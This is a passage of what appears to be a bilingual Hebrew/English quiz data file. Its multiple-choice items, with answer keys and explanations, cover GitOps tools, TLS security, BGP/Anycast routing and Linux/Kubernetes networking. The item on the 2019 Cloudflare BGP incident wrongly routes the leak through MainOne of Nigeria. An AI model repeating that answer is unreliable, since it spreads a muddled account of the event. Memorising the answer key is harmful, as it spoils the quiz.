      correctEn: "Rolling Update replaces pods gradually without control — Argo Rollouts enables Canary (% traffic to new version) and Blue/Green with automatic analysis and rollback",
      choicesEn: [
        "Rolling Update replaces pods gradually without control — Argo Rollouts enables Canary (% traffic to new version) and Blue/Green with automatic analysis and rollback",
        "Argo Rollouts = Argo CD with extra features only",
        "Canary deployment = deploy to canary server only",
        "Progressive Delivery is possible only with Istio service mesh"
      ]
    },
        {
      q: "מה Fluxcd ואיך שונה מArgoCD?",
      correct: "שניהם GitOps controllers — Flux: CLI-centric, operator per component (source-controller, kustomize-controller) — Argo: UI חזקה, Application CRD, monolithic approach",
      choices: [
        "שניהם GitOps controllers — Flux: CLI-centric, operator per component (source-controller, kustomize-controller) — Argo: UI חזקה, Application CRD, monolithic approach",
        "‏Flux לAWS בלבד — ArgoCD לGCP ו־Azure",
        "‏FluxCD מיושן — ArgoCD החליף אותו לחלוטין",
        "‏Flux לsmall clusters — ArgoCD לenterprise בלבד"
      ],
      explanation: "‏Flux v2 (CNCF Graduated): GitRepository CR → מצביע על repo; Kustomization CR → מיישם path.\n\nעיקרי:\n- Multi-tenancy טוב\n- Notification Controller לSlack/Teams\n- Image Automation: מעדכן Git אוטומטית עם tag חדש מRegistry",
      explanationEn: "Flux v2 (CNCF Graduated): GitRepository CR points to repo; Kustomization CR applies path.\n\nMain Points:\n- Good multi-tenancy\n- Notification Controller for Slack/Teams\n- Image Automation: updates Git automatically with new tag from Registry",
      qEn: "What is Fluxcd and how is it different from ArgoCD?",
      correctEn: "Both are GitOps controllers — Flux: CLI-centric, operator per component (source-controller, kustomize-controller) — Argo: strong UI, Application CRD, monolithic approach",
      choicesEn: [
        "Both are GitOps controllers — Flux: CLI-centric, operator per component (source-controller, kustomize-controller) — Argo: strong UI, Application CRD, monolithic approach",
        "Flux for AWS only — ArgoCD for GCP and Azure",
        "FluxCD is outdated — ArgoCD replaced it completely",
        "Flux for small clusters — ArgoCD for enterprise only"
      ]
    },
    {
      q: "מה GitOps ואיך שונה מ־CI/CD רגיל?",
      correct: "‏GitOps: Git הוא source of truth לinfrastructure. שינוי ב־Git → agent (ArgoCD) מזהה drift ו-syncs. CI/CD רגיל: pipeline דוחפת לcluster",
      choices: [
        "‏GitOps: Git הוא source of truth לinfrastructure. שינוי ב־Git → agent (ArgoCD) מזהה drift ו-syncs. CI/CD רגיל: pipeline דוחפת לcluster",
        "‏GitOps = CI/CD עם Git בלבד",
        "‏GitOps ו־CI/CD זהים",
        "‏GitOps עובד רק עם Kubernetes"
      ],
      explanation: "‏GitOps principles (Weaveworks): 1) Declarative: כל infra כ-code.\n\nעיקרי:\n- 2) Versioned: Git כsingle source of truth\n- 3) Automatic: approved changes מיושמות אוטומטית\n- 4) Continuously reconciled: agent מזהה ומתקן drift",
      explanationEn: "GitOps principles (Weaveworks): 1) Declarative: all infra as code.\n\nMain Points:\n- 2) Versioned: Git as single source of truth\n- 3) Automatic: approved changes applied automatically\n- 4) Continuously reconciled: agent detects and fixes drift",
      qEn: "What is GitOps and how is it different from regular CI/CD?",
      correctEn: "GitOps: Git is the source of truth for infrastructure. Change in Git leads to agent (ArgoCD) detecting drift and syncing. Regular CI/CD: pipeline pushes to cluster",
      choicesEn: [
        "GitOps: Git is the source of truth for infrastructure. Change in Git leads to agent (ArgoCD) detecting drift and syncing. Regular CI/CD: pipeline pushes to cluster",
        "GitOps = CI/CD with Git only",
        "GitOps and CI/CD are the same",
        "GitOps works only with Kubernetes"
      ]
    },
    {
      q: "מה Progressive Delivery ב־GitOps context?",
      correct: "‏Argo Rollouts / Flagger: canary deployments, blue/green, A/B testing — שינוי מדורג עם rollback אוטומטי אם metrics נכשלים",
      choices: [
        "‏Argo Rollouts / Flagger: canary deployments, blue/green, A/B testing — שינוי מדורג עם rollback אוטומטי אם metrics נכשלים",
        "‏Progressive Delivery = CI/CD pipeline stages בלבד",
        "‏GitOps לא תומך ב-canary deployments",
        "‏Progressive = deploying לmost servers ראשון"
      ],
      explanation: "‏Argo Rollouts: CRD שמחליף Deployment.\n\nעיקרי:\n- Strategy: canary (5% → 20% → 50% → 100%), blueGreen (preview + active)\n- Analysis: Prometheus queries\n- אם error rate > 5% → automatic rollback",
      explanationEn: "Argo Rollouts: CRD replacing Deployment.\n\nMain Points:\n- Strategy: canary (5% to 20% to 50% to 100%), blueGreen (preview + active)\n- Analysis: Prometheus queries\n- If error rate > 5% = automatic rollback",
      qEn: "What is Progressive Delivery in a GitOps context?",
      correctEn: "Argo Rollouts / Flagger: canary deployments, blue/green, A/B testing — gradual change with automatic rollback if metrics fail",
      choicesEn: [
        "Argo Rollouts / Flagger: canary deployments, blue/green, A/B testing — gradual change with automatic rollback if metrics fail",
        "Progressive Delivery = CI/CD pipeline stages only",
        "GitOps does not support canary deployments",
        "Progressive = deploying to most servers first"
      ]
    }
  ],

  306: [
    {
      q: "מה Forward Secrecy ב־TLS ולמה זה חשוב?",
      correct: "מייצר session key חדש לכל session (ECDHE) — גנב private key לא יוכל לפענח שיחות עבר",
      choices: [
        "מייצר session key חדש לכל session (ECDHE) — גנב private key לא יוכל לפענח שיחות עבר",
        "הצפנה של TLS קדימה לgenerations עתידיים",
        "‏TLS 1.3 מצפין גם headers של HTTP",
        "‏Forward Secrecy = TLS עם certificate pinning"
      ],
      explanation: "‏ב־RSA key exchange (TLS 1.2): הclient מצפין session key בpublic key של השרת.\n\nעיקרי:\n- תוקף שהקליט traffic ב־2020 וגנב private key ב־2024 — יכול לפענח את ה-2020 traffic\n- ב־ECDHE (TLS 1.3 חובה): מפתחות ephemeral נוצרים per-session ונמחקים\n- אין מפתח ישן לgraceful",
      explanationEn: "In RSA key exchange (TLS 1.2): client encrypts session key with server's public key.\n\nMain Points:\n- Attacker who recorded traffic in 2020 and stole private key in 2024 can decrypt the 2020 traffic\n- In ECDHE (mandatory in TLS 1.3): ephemeral keys are generated per-session and deleted\n- No old key to exploit",
      qEn: "What is Forward Secrecy in TLS and why is it important?",
      correctEn: "Creates a new session key for each session (ECDHE) — someone who steals the private key cannot decrypt past conversations",
      choicesEn: [
        "Creates a new session key for each session (ECDHE) — someone who steals the private key cannot decrypt past conversations",
        "Encryption of TLS forward for future generations",
        "TLS 1.3 also encrypts HTTP headers",
        "Forward Secrecy = TLS with certificate pinning"
      ]
    },
    {
      q: "למה RC4 ו־SHA-1 הוסרו מ־TLS 1.3?",
      correct: "‏RC4 הוכח cryptographically broken ב־2013, SHA-1 collision הוכח ב־2017 (Google SHAttered)",
      choices: [
        "‏RC4 הוכח cryptographically broken ב־2013, SHA-1 collision הוכח ב־2017 (Google SHAttered)",
        "‏RC4 ו־SHA-1 איטיים מדי לhardware מודרני",
        "הוסרו רק כדי לפשט את הstandard, לא מסיבות אבטחה",
        "‏RC4 תומך רק ב־IPv4"
      ],
      explanation: "‏RC4: AlFardan et al.\n\nעיקרי:\n- 2013 הראו biases סטטיסטיים שמאפשרים לפענח HTTPS cookies אחרי ~2^26 connections\n- BEAST attack (2011) ניצל CBC ב־TLS 1.0\n- SHA-1: Google SHAttered 2017 — נמצאו שני PDF files שונים עם אותו SHA-1 hash, עם GPU cluster בעלות $110K",
      explanationEn: "RC4: AlFardan et al.\n\nMain Points:\n- 2013 showed statistical biases enabling HTTPS cookie decryption after ~2^26 connections\n- BEAST attack (2011) exploited CBC in TLS 1.0\n- SHA-1: Google SHAttered 2017 — two different PDF files with the same SHA-1 hash, produced with a GPU cluster costing $110K",
      qEn: "Why were RC4 and SHA-1 removed from TLS 1.3?",
      correctEn: "RC4 was proven cryptographically broken in 2013, SHA-1 collision was proven in 2017 (Google SHAttered)",
      choicesEn: [
        "RC4 was proven cryptographically broken in 2013, SHA-1 collision was proven in 2017 (Google SHAttered)",
        "RC4 and SHA-1 are too slow for modern hardware",
        "Removed only to simplify the standard, not for security reasons",
        "RC4 supports only IPv4"
      ]
    },
    {
      q: "מה ההבדל ב־RTT בין TLS 1.2 לTLS 1.3?",
      correct: "‏TLS 1.2 דורש 2-RTT לפני application data, TLS 1.3 דורש 1-RTT ‎(ו-0-RTT לsession resumption)‎",
      choices: [
        "‏TLS 1.2 דורש 2-RTT לפני application data, TLS 1.3 דורש 1-RTT ‎(ו-0-RTT לsession resumption)‎",
        "‏TLS 1.2 מהיר יותר כי יש לו יותר cipher options",
        "שניהם דורשים 2-RTT, ההבדל הוא בהצפנה בלבד",
        "‏TLS 1.3 תמיד 0-RTT"
      ],
      explanation: "‏TLS 1.2: ClientHello → ServerHello+Cert → KeyExchange → Finished → Data = 2 full RTT.\n\nעיקרי:\n- TLS 1.3: הclient שולח KeyShare כבר בClientHello הראשון\n- השרת עונה עם ServerHello+keys+Finished = 1 RTT\n- 0-RTT (Early Data): בsession resumption, הclient שולח data בround trip הראשון",
      explanationEn: "TLS 1.2: ClientHello, ServerHello+Cert, KeyExchange, Finished, Data = 2 full RTT.\n\nMain Points:\n- TLS 1.3: client sends KeyShare already in the first ClientHello\n- Server responds with ServerHello+keys+Finished = 1 RTT\n- 0-RTT (Early Data): in session resumption, client sends data in the first round trip",
      qEn: "What is the RTT difference between TLS 1.2 and TLS 1.3?",
      correctEn: "TLS 1.2 requires 2-RTT before application data, TLS 1.3 requires 1-RTT (and 0-RTT for session resumption)",
      choicesEn: [
        "TLS 1.2 requires 2-RTT before application data, TLS 1.3 requires 1-RTT (and 0-RTT for session resumption)",
        "TLS 1.2 is faster because it has more cipher options",
        "Both require 2-RTT, the difference is only in encryption",
        "TLS 1.3 is always 0-RTT"
      ]
    },
        {
      q: "מה ECDHE ב־TLS ואיך מאפשר Perfect Forward Secrecy?",
      correct: "‏Elliptic Curve Diffie-Hellman Ephemeral: שני הצדדים מייצרים key pairs זמניים, מחשבים shared secret, ומיד מוחקים private keys — ניצול future = אין ערך לold traffic",
      choices: [
        "‏Elliptic Curve Diffie-Hellman Ephemeral: שני הצדדים מייצרים key pairs זמניים, מחשבים shared secret, ומיד מוחקים private keys — ניצול future = אין ערך לold traffic",
        "‏ECDHE = RSA עם elliptic curve parameters",
        "‏Ephemeral = ה-key מוצפן בsession cookie",
        "‏ECDHE מאפשר authentication ללא certificates"
      ],
      explanation: "‏Diffie-Hellman: שני צדדים חולקים public numbers g^a mod p ו-g^b mod p → מחשבים g^ab mod p (shared secret) ללא שליחת a או b.\n\nעיקרי:\n- Elliptic Curve: g^a → נקודת עקומה אליפטית — יעיל יותר (256-bit EC = 3072-bit RSA security)\n- Ephemeral: מפתחות חדשים לכל session, נמחקים אחרי\n- גם אם תוקף שבר את ה־EC discrete log בעוד 10 שנים — sessions ישנות לא מפוענחות",
      explanationEn: "Diffie-Hellman: two parties share public numbers g^a mod p and g^b mod p, compute g^ab mod p (shared secret) without sending a or b.\n\nMain Points:\n- Elliptic Curve: uses elliptic curve points — more efficient (256-bit EC = 3072-bit RSA security)\n- Ephemeral: new keys per session, deleted after\n- Even if an attacker breaks EC discrete log in 10 years — old sessions cannot be decrypted",
      qEn: "What is ECDHE in TLS and how does it enable Perfect Forward Secrecy?",
      correctEn: "Elliptic Curve Diffie-Hellman Ephemeral: both sides generate temporary key pairs, compute shared secret, and immediately delete private keys — future exploit has no value for old traffic",
      choicesEn: [
        "Elliptic Curve Diffie-Hellman Ephemeral: both sides generate temporary key pairs, compute shared secret, and immediately delete private keys — future exploit has no value for old traffic",
        "ECDHE = RSA with elliptic curve parameters",
        "Ephemeral = the key is encrypted in a session cookie",
        "ECDHE allows authentication without certificates"
      ]
    },
        {
      q: "מה Certificate Transparency (CT) ואיך מגן מפני rogue certificates?",
      correct: "‏CT Logs: append-only public logs של כל TLS certificates שהונפקו — browsers מאמתים שcert נכלל ב־CT log — CA סורר לא יכול להנפיק certificate בסתר",
      choices: [
        "‏CT Logs: append-only public logs של כל TLS certificates שהונפקו — browsers מאמתים שcert נכלל ב־CT log — CA סורר לא יכול להנפיק certificate בסתר",
        "‏Certificate Transparency = certificate pinning בdomain",
        "‏CT הוא שם אחר ל־HSTS preloading",
        "‏CT logs מוצפנים ונגישים רק לbrowsers"
      ],
      explanation: "‏בעיה: DigiNotar 2011 הנפיקה wildcard cert של *.google.com ל־MITM by Iranian government.\n\nעיקרי:\n- CT (RFC 6962): כל CA חייב לsubmit כל cert לCT logs (Google Argon, Cloudflare Nimbus)\n- Signed Certificate Timestamp (SCT): proof שcert הוגש\n- Browsers (Chrome 2018+): דוחים certs ללא valid SCT",
      explanationEn: "Problem: DigiNotar 2011 issued a wildcard cert for *.google.com for MITM by Iranian government.\n\nMain Points:\n- CT (RFC 6962): every CA must submit every cert to CT logs (Google Argon, Cloudflare Nimbus)\n- Signed Certificate Timestamp (SCT): proof that cert was submitted\n- Browsers (Chrome 2018+): reject certs without valid SCT",
      qEn: "What is Certificate Transparency (CT) and how does it protect against rogue certificates?",
      correctEn: "CT Logs: append-only public logs of all issued TLS certificates — browsers verify that a cert is in a CT log — a rogue CA cannot issue a certificate secretly",
      choicesEn: [
        "CT Logs: append-only public logs of all issued TLS certificates — browsers verify that a cert is in a CT log — a rogue CA cannot issue a certificate secretly",
        "Certificate Transparency = certificate pinning on domain",
        "CT is another name for HSTS preloading",
        "CT logs are encrypted and accessible only to browsers"
      ]
    }
  ],

  307: [
    {
      q: "כיצד Anycast מנתב traffic לPOP הקרוב ביותר?",
      correct: "אותו IP prefix מפורסם מ־BGP ממקומות רבים — BGP בוחר shortest AS path = הPOP הקרוב",
      choices: [
        "אותו IP prefix מפורסם מ־BGP ממקומות רבים — BGP בוחר shortest AS path = הPOP הקרוב",
        "‏DNS מחזיר IP שונה לפי geolocation",
        "ה־LB מפנה לPOP הקרוב לפי latency",
        "‏HTTP redirect לURL של הPOP הקרוב"
      ],
      explanation: "‏Anycast: Cloudflare מפרסמת 1.1.1.0/24 ב־BGP מ־300+ POPs.\n\nעיקרי:\n- כשrouter בתל אביב מחפש 1.1.1.1 — הוא רואה כמה paths, בוחר הקצר ביותר (AS hops) = POP בתל אביב\n- שימוש: DNS root servers, CDN, DDoS mitigation\n- לא מתאים לTCP sessions ארוכים כי connection עלול לנדוד בין POPs",
      explanationEn: "Anycast: Cloudflare advertises 1.1.1.0/24 via BGP from 300+ POPs.\n\nMain Points:\n- When a router in Tel Aviv looks up 1.1.1.1, it sees multiple paths and chooses the shortest (AS hops) = POP in Tel Aviv\n- Uses: DNS root servers, CDN, DDoS mitigation\n- Not suitable for long TCP sessions as connection may migrate between POPs",
      qEn: "How does Anycast route traffic to the closest POP?",
      correctEn: "The same IP prefix is advertised via BGP from many locations — BGP chooses the shortest AS path = closest POP",
      choicesEn: [
        "The same IP prefix is advertised via BGP from many locations — BGP chooses the shortest AS path = closest POP",
        "DNS returns a different IP based on geolocation",
        "The LB redirects to the closest POP by latency",
        "HTTP redirect to the URL of the closest POP"
      ]
    },
    {
      q: "מה BGP hijacking וכיצד RPKI מונע אותו?",
      correct: "‏BGP hijacking = AS מכריז על prefix שלא שייך לו. RPKI = ROAs חתומות cryptographically שמאמתות מי מורשה להכריז",
      choices: [
        "‏BGP hijacking = AS מכריז על prefix שלא שייך לו. RPKI = ROAs חתומות cryptographically שמאמתות מי מורשה להכריז",
        "‏BGP hijacking = DDoS attack על routers. RPKI = firewall לBGP",
        "‏BGP hijacking = man-in-the-middle ב־TCP. RPKI = TLS לBGP",
        "‏BGP hijacking רלוונטי רק לIPv6"
      ],
      explanation: "‏Pakistan Telecom 2008: הכריזו על 208.65.153.0/24 (YouTube) — כל האינטרנט שלח traffic ל־Pakistan.\n\nעיקרי:\n- BGP trust-based = כל AS יכול להכריז על כל prefix\n- RPKI: RIRs (RIPE, ARIN, APNIC) מפרסמים ROA (Route Origin Authorization) חתומה — 'AS13335 מורשה להכריז על 1.1.1.0/24'\n- Routers שמסננים לפי RPKI דוחים invalid routes",
      explanationEn: "Pakistan Telecom 2008: announced 208.65.153.0/24 (YouTube) — the entire internet sent traffic to Pakistan.\n\nMain Points:\n- BGP is trust-based = any AS can announce any prefix\n- RPKI: RIRs (RIPE, ARIN, APNIC) publish ROA (Route Origin Authorization) signed — 'AS13335 is authorized to announce 1.1.1.0/24'\n- Routers filtering by RPKI reject invalid routes",
      qEn: "What is BGP hijacking and how does RPKI prevent it?",
      correctEn: "BGP hijacking = an AS announces a prefix it does not own. RPKI = ROAs signed cryptographically that verify who is authorized to announce",
      choicesEn: [
        "BGP hijacking = an AS announces a prefix it does not own. RPKI = ROAs signed cryptographically that verify who is authorized to announce",
        "BGP hijacking = DDoS attack on routers. RPKI = firewall for BGP",
        "BGP hijacking = man-in-the-middle on TCP. RPKI = TLS for BGP",
        "BGP hijacking is relevant only for IPv6"
      ]
    },
    {
      q: "מדוע Anycast מצוין להגנה מDDoS?",
      correct: "‏Attack traffic מחולק בין כל ה־POPs בעולם — כל POP סופג חלק קטן במקום שכולו יגיע לנקודה אחת",
      choices: [
        "‏Attack traffic מחולק בין כל ה־POPs בעולם — כל POP סופג חלק קטן במקום שכולו יגיע לנקודה אחת",
        "‏Anycast מצפין traffic ולכן DDoS לא עובד",
        "‏Anycast מסנן traffic זדוני לפי source IP",
        "‏Anycast רלוונטי רק לUDP floods, לא לTCP SYN floods"
      ],
      explanation: "‏Cloudflare עם 300 POPs = 300 נקודות קליטה.\n\nעיקרי:\n- DDoS של 2Tbps מחולק ל-~6.7Gbps לכל POP — ניתן לספוג בקלות\n- ב-unicast, כל ה-2Tbps היה פוגע בנקודה אחת\n- בנוסף, Anycast BGP failover אוטומטי: POP שנפל תחת load → מסיר את ה-prefix מBGP → traffic עובר לPOP הבא הקרוב",
      explanationEn: "Cloudflare with 300 POPs = 300 absorption points.\n\nMain Points:\n- A 2Tbps DDoS is split to ~6.7Gbps per POP — easily absorbed\n- With unicast, all 2Tbps would hit a single point\n- Additionally, Anycast BGP failover is automatic: POP under load removes its prefix from BGP, traffic shifts to nearest POP",
      qEn: "Why is Anycast great for DDoS protection?",
      correctEn: "Attack traffic is split between all POPs worldwide — each POP absorbs a small part instead of all hitting one point",
      choicesEn: [
        "Attack traffic is split between all POPs worldwide — each POP absorbs a small part instead of all hitting one point",
        "Anycast encrypts traffic so DDoS does not work",
        "Anycast filters malicious traffic by source IP",
        "Anycast is relevant only for UDP floods, not TCP SYN floods"
      ]
    },
        {
      q: "מה BGPsec ואיך שונה מRPKI?",
      correct: "‏RPKI מוודא את origin AS בלבד — BGPsec חותם כל hop בAS Path — מגן גם מ-path manipulation לא רק origin hijacking",
      choices: [
        "‏RPKI מוודא את origin AS בלבד — BGPsec חותם כל hop בAS Path — מגן גם מ-path manipulation לא רק origin hijacking",
        "‏BGPsec = RPKI 2.0 — ההבדל רק בגרסה",
        "‏RPKI לIPv6 — BGPsec לIPv4",
        "‏BGPsec מוצפן — RPKI רק signed"
      ],
      explanation: "‏RPKI/ROA: validates 'AS64501 is legitimate originator of 192.0.2.0/24'.\n\nעיקרי:\n- אבל: AS Path: 64501 → 64502 → 64503\n- AS64502 יכול לשנות path\n- BGPsec (RFC 8205): כל AS שמעביר UPDATE מוסיף חתימה קריפטוגרפית",
      explanationEn: "RPKI/ROA: validates that an AS is the legitimate originator of a prefix.\n\nMain Points:\n- But AS Path can still be manipulated\n- BGPsec (RFC 8205): each AS forwarding an UPDATE adds a cryptographic signature\n- Receiver validates every hop in the AS path was signed",
      qEn: "What is BGPsec and how is it different from RPKI?",
      correctEn: "RPKI validates only the origin AS — BGPsec signs every hop in the AS Path — protects against path manipulation not just origin hijacking",
      choicesEn: [
        "RPKI validates only the origin AS — BGPsec signs every hop in the AS Path — protects against path manipulation not just origin hijacking",
        "BGPsec = RPKI 2.0 — the difference is just the version",
        "RPKI for IPv6 — BGPsec for IPv4",
        "BGPsec is encrypted — RPKI is only signed"
      ]
    },
        {
      q: "מה קרה בתקרית Cloudflare 2019 ב־BGP routing ומה הלקח?",
      correct: "‏MainOne ‎(ניגריה)‎ דרכה Verizon הכריזה paths חשובים → traffic ממשתמשי Cloudflare עבר דרך AS קטן בלתי מסוגל — קריסה 1.5 שעות — לקח: RPKI filtering חובה אצל large providers",
      choices: [
        "‏MainOne ‎(ניגריה)‎ דרכה Verizon הכריזה paths חשובים → traffic ממשתמשי Cloudflare עבר דרך AS קטן בלתי מסוגל — קריסה 1.5 שעות — לקח: RPKI filtering חובה אצל large providers",
        "‏Cloudflare עצמה גרמה לhijack על ידי שגיאת routing config",
        "‏BGP attack ממוקד על Cloudflare DNS servers בלבד",
        "‏Cloudflare 2019 = פרסום accidental של IPv6 prefixes"
      ],
      explanation: "‏2019-06-24: DQE Communications (PA) שלחה routes שגויים לMainOne (Nigeria) שלחה לVerizon.\n\nעיקרי:\n- Verizon (AS701) = Tier-1 — לא filter\n- הכריזה ל-internet\n- Cloudflare prefixes הוסטו דרך path ארוך ועמוס",
      explanationEn: "2019-06-24: DQE Communications (PA) sent wrong routes to MainOne (Nigeria), which forwarded to Verizon.\n\nMain Points:\n- Verizon (AS701) = Tier-1 — did not filter\n- Announced to the internet\n- Cloudflare prefixes were routed through a long, overloaded path",
      qEn: "What happened in the Cloudflare 2019 BGP routing incident and what was the lesson?",
      correctEn: "MainOne (Nigeria) through Verizon announced important paths — traffic from Cloudflare users went through a small incapable AS — 1.5 hour outage — lesson: RPKI filtering is a must for large providers",
      choicesEn: [
        "MainOne (Nigeria) through Verizon announced important paths — traffic from Cloudflare users went through a small incapable AS — 1.5 hour outage — lesson: RPKI filtering is a must for large providers",
        "Cloudflare itself caused the hijack by a routing config mistake",
        "Targeted BGP attack on Cloudflare DNS servers only",
        "Cloudflare 2019 = accidental IPv6 prefix announcement"
      ]
    }
  ],

  308: [
    {
      q: "מה veth pair ב־Linux networking?",
      correct: "זוג virtual ethernet interfaces מחוברים — מה שנכנס לאחד יוצא מהשני, משמש לחיבור container לhost",
      choices: [
        "זוג virtual ethernet interfaces מחוברים — מה שנכנס לאחד יוצא מהשני, משמש לחיבור container לhost",
        "‏virtual ethernet שמאפשר מספר VLANs על interface אחד",
        "חיבור בין שני hosts פיזיים",
        "שם אחר לloopback interface"
      ],
      explanation: "‏veth pair = כבל וירטואלי.\n\nעיקרי:\n- Docker יוצר veth pair: קצה אחד (eth0) בnamespace של הcontainer, קצה שני (vethXXXXXX) בhost namespace ומחובר לbridge docker0\n- packet שנשלח מcontainer → eth0 → veth pair → vethXXX בhost → docker0 bridge → routing\n- ip link add veth0 type veth peer name veth1 יוצר את ה-pair",
      explanationEn: "veth pair = virtual cable.\n\nMain Points:\n- Docker creates a veth pair: one end (eth0) in the container's namespace, the other end (vethXXXXXX) in the host namespace connected to the docker0 bridge\n- Packet flow from container: eth0, veth pair, vethXXX on host, docker0 bridge, routing\n- ip link add veth0 type veth peer name veth1 creates the pair",
      qEn: "What is a veth pair in Linux networking?",
      correctEn: "A pair of connected virtual ethernet interfaces — what enters one exits the other, used to connect container to host",
      choicesEn: [
        "A pair of connected virtual ethernet interfaces — what enters one exits the other, used to connect container to host",
        "Virtual ethernet that allows multiple VLANs on one interface",
        "Connection between two physical hosts",
        "Another name for loopback interface"
      ]
    },
    {
      q: "מה ההבדל בין Flannel לCalico כ־CNI plugins?",
      correct: "‏Flannel משתמש ב־VXLAN overlay (encapsulation), Calico משתמש ב־BGP routing ‎(L3, ללא encapsulation, מהיר יותר)‎",
      choices: [
        "‏Flannel משתמש ב־VXLAN overlay (encapsulation), Calico משתמש ב־BGP routing ‎(L3, ללא encapsulation, מהיר יותר)‎",
        "‏Flannel לpublic cloud, Calico לon-premise בלבד",
        "‏Calico ישן יותר ולכן פחות מומלץ",
        "שניהם זהים, ההבדל הוא בממשק הניהול בלבד"
      ],
      explanation: "‏Flannel VXLAN: packets בין nodes מוצפנים ב־UDP header (encapsulation).\n\nעיקרי:\n- פשוט להתקנה אבל overhead\n- Calico BGP: כל Kubernetes node הוא BGP router שמפרסם את ה-podCIDR שלו\n- Packets עוברים ב־L3 ישירות ללא encapsulation = ביצועים גבוהים יותר",
      explanationEn: "Flannel VXLAN: packets between nodes are encapsulated in UDP header.\n\nMain Points:\n- Simple to install but has overhead\n- Calico BGP: every Kubernetes node is a BGP router advertising its podCIDR\n- Packets travel at L3 directly without encapsulation = higher performance",
      qEn: "What is the difference between Flannel and Calico as CNI plugins?",
      correctEn: "Flannel uses VXLAN overlay (encapsulation), Calico uses BGP routing (L3, no encapsulation, faster)",
      choicesEn: [
        "Flannel uses VXLAN overlay (encapsulation), Calico uses BGP routing (L3, no encapsulation, faster)",
        "Flannel for public cloud, Calico for on-premise only",
        "Calico is older and less recommended",
        "Both are the same, the difference is the management interface only"
      ]
    },
    {
      q: "כיצד pod-to-pod communication עובד בין שני nodes שונים ב־Kubernetes?",
      correct: "תלוי ב־CNI: Flannel = VXLAN tunnel, Calico = BGP routes ישירות, Cilium = eBPF forwarding",
      choices: [
        "תלוי ב־CNI: Flannel = VXLAN tunnel, Calico = BGP routes ישירות, Cilium = eBPF forwarding",
        "‏Kubernetes מספק NAT אוטומטי בין nodes",
        "‏pods חייבים להיות באותו node לתקשורת ישירה",
        "תמיד עובר דרך kube-proxy על ה-master node"
      ],
      explanation: "‏Kubernetes CNI contract: כל pod יכול לדבר עם כל pod ב-pod IP שלו, ללא NAT.\n\nעיקרי:\n- אותו node = veth pair → bridge → L2 forwarding מהיר\n- בין nodes: CNI מממש\n- Flannel: מוסיף VXLAN header (UDP 8472) → underlay network → מסיר header ב-node היעד",
      explanationEn: "Kubernetes CNI contract: every pod can talk to every pod using its pod IP, without NAT.\n\nMain Points:\n- Same node = veth pair to bridge to fast L2 forwarding\n- Between nodes: CNI implements\n- Flannel: adds VXLAN header (UDP 8472), underlay network, removes header at destination node",
      qEn: "How does pod-to-pod communication work between two different nodes in Kubernetes?",
      correctEn: "Depends on CNI: Flannel = VXLAN tunnel, Calico = direct BGP routes, Cilium = eBPF forwarding",
      choicesEn: [
        "Depends on CNI: Flannel = VXLAN tunnel, Calico = direct BGP routes, Cilium = eBPF forwarding",
        "Kubernetes provides automatic NAT between nodes",
        "Pods must be on the same node for direct communication",
        "Always goes through kube-proxy on the master node"
      ]
    },
    {
      q: "מה network namespace ב־Linux ואיך Docker משתמש בו?",
      correct: "‏Network namespace מבודד stack רשת שלם (interfaces, routing, iptables) — כל Docker container מקבל namespace נפרד — containers לא רואים את interface של אחד מהשני",
      choices: [
        "‏Network namespace מבודד stack רשת שלם (interfaces, routing, iptables) — כל Docker container מקבל namespace נפרד — containers לא רואים את interface של אחד מהשני",
        "‏Network namespace = VLAN ב־Docker",
        "‏Network namespace מגביל bandwidth לcontainer",
        "כל containers בhost משתפים network namespace"
      ],
      explanation: "‏Linux Namespaces: network, PID, mount, UTS, IPC, user, cgroup.\n\nעיקרי:\n- Network namespace: ip netns add mynet → namespace חדש עם lo בלבד\n- ip link add veth0 type veth peer name veth1 → pair\n- ip link set veth1 netns mynet → veth1 עובר לnamespace",
      explanationEn: "Linux Namespaces: network, PID, mount, UTS, IPC, user, cgroup.\n\nMain Points:\n- Network namespace: ip netns add mynet creates a new namespace with lo only\n- ip link add veth0 type veth peer name veth1 creates a pair\n- ip link set veth1 netns mynet moves veth1 to the namespace",
      qEn: "What is a network namespace in Linux and how does Docker use it?",
      correctEn: "Network namespace isolates a full network stack (interfaces, routing, iptables) — each Docker container gets a separate namespace — containers cannot see each other's interfaces",
      choicesEn: [
        "Network namespace isolates a full network stack (interfaces, routing, iptables) — each Docker container gets a separate namespace — containers cannot see each other's interfaces",
        "Network namespace = VLAN in Docker",
        "Network namespace limits bandwidth to a container",
        "All containers on a host share network namespace"
      ]
    },
    {
      q: "מה ההבדל בין bridge network mode לבין host network mode ב־Docker?",
      correct: "‏bridge: container מקבל namespace נפרד, IP private מdocker0 bridge, NAT לחוץ — host: container משתף network namespace של host — ביצועים גבוהים אך אין בידוד",
      choices: [
        "‏bridge: container מקבל namespace נפרד, IP private מdocker0 bridge, NAT לחוץ — host: container משתף network namespace של host — ביצועים גבוהים אך אין בידוד",
        "‏bridge לproduction — host לdevelopment בלבד",
        "‏host mode מהיר פי 10 — תמיד להשתמש בו",
        "‏bridge ו-host זהים ב־Kubernetes"
      ],
      explanation: "‏Bridge (default): docker0 bridge IP 172.17.0.1.\n\nעיקרי:\n- container מקבל 172.17.0.2\n- docker run -p 8080:80: iptables DNAT rule\n- Host mode: docker run --network host nginx → nginx שומע על port 80 של host ישירות, ללא NAT",
      explanationEn: "Bridge (default): docker0 bridge IP 172.17.0.1.\n\nMain Points:\n- Container gets 172.17.0.2\n- docker run -p 8080:80 creates iptables DNAT rule\n- Host mode: docker run --network host nginx listens on host's port 80 directly, no NAT",
      qEn: "What is the difference between bridge network mode and host network mode in Docker?",
      correctEn: "bridge: container gets a separate namespace, private IP from docker0 bridge, NAT outbound — host: container shares the host network namespace — high performance but no isolation",
      choicesEn: [
        "bridge: container gets a separate namespace, private IP from docker0 bridge, NAT outbound — host: container shares the host network namespace — high performance but no isolation",
        "bridge for production — host for development only",
        "host mode is 10x faster — always use it",
        "bridge and host are the same in Kubernetes"
      ]
    },
    {
      q: "מה תפקיד kube-proxy ב־Kubernetes networking?",
      correct: "מנהל iptables/IPVS rules ב-כל node כדי לנתב traffic מ־Service ClusterIP לpods הרלוונטיים",
      choices: [
        "מנהל iptables/IPVS rules ב-כל node כדי לנתב traffic מ־Service ClusterIP לpods הרלוונטיים",
        "‏proxy בין internet לcluster לאבטחה",
        "מנהל DNS resolution עבור services",
        "מממש NetworkPolicy לסינון traffic בין pods"
      ],
